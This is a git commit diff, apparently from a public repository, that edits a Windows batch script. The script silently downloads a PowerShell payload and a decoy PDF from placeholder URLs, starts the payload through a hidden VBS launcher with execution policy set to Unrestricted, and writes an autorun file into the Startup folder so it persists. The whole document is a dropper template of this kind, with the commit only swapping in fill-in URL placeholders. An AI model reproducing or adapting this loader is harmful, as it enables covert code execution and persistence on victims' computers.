d4b795c6741200290a78024e6c09d748c0bfec76
iamh4dez <145866956+iamh4dez@users.noreply.github.com>
2023-09-24 02:21:23 +0800

    Update script.bat

--- script.bat
+++ script.bat
@@ -2,8 +2,8 @@ cd "%USERPROFILE%\AppData\Local\Temp\"
 echo command = "powershell.exe -nologo -ExecutionPolicy Unrestricted -File %temp%\script.ps1" >run.vbs
 echo set shell = CreateObject("WScript.Shell") >>run.vbs
 echo shell.Run command,0 >>run.vbs
-powershell.exe -WindowStyle hidden wget https://site.com/script.ps1 -OutFile %TEMP%\script.ps1
-powershell.exe -WindowStyle hidden wget https://site.com/document.pdf -OutFile %TEMP%\document.pdf
+powershell.exe -WindowStyle hidden wget <your_script_url>/script.ps1 -OutFile %TEMP%\script.ps1
+powershell.exe -WindowStyle hidden wget <your_pdf_url>/document.pdf -OutFile %TEMP%\document.pdf
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
 echo wscript %USERPROFILE%\AppData\Local\Temp\run.vbs > autorun.bat
 start /B autorun.bat
